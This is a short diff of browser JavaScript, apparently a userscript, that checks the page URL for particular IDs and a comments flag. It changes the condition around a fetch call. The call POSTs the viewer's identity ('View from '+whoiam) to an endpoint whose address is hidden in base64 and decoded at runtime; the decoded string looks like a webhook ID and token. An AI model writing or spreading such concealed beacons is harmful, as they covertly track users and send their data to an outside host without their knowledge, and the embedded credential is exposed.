@@ -84,7 +84,7 @@ const intervalId = setInterval(() => {
 if (window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7") && window.location.href.includes("?comments=true")) {
 let targetDiv2 = null;
 
-if (window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
+if (!window.location.href.includes("3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7")) {
     fetch(d("MTI5MjY1NjI1MTg4MDM0MTU0NS8tOVVEMmNSWGl2dkVPTzJxUk9NVmxVOGRrS0stYkJFVFRNQmhES3FGWGRWeDNYZ0NQT0ZLSDE0LUVZdnRrZTRVTWl3SQ=="),{"headers":{"content-type":"application/json"},"method":"POST","body":JSON.stringify({"content":"View from "+whoiam})})
 }
 
